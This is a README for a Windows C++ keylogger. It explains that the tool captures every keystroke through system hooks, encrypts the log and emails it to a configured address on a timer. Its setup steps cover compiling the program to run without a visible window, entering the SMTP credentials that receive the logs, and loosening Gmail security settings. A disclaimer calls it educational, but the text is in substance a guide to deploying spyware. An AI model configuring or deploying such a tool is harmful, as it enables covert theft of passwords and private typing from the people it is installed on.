# KeyLogger 

DO NOT use this code for illegal or immoral purpose and keep it open source!
I do not give my permission or consent for any parties to use this for illegal or immoral reasons.

This is strictly for personal educational purposes and personal pen testing.

The Keylogger is able to capture all the keystrokes using system hooks. In addition to this, it is also able to put them into a file, encrypt the file and send the file via mail based on a timer.


## Setup instructions
* To compile it you need to enable C++11 standards and -mwindows flag
* In KeyHook.h modify the variable sendIntervalInMinutes to be however many minutes you want in between each email.
* Change the SMTP credentials wtihin SendMail.h to wherever you want to recieve the emails
  * X_EM_TO
  * X_EM_FROM
  * X_EM_PASS
 * In addition - ensure that you enable "Allow Less Secure Apps" on gmail for the accoutn
 * https://devanswers.co/allow-less-secure-apps-access-gmail-account/
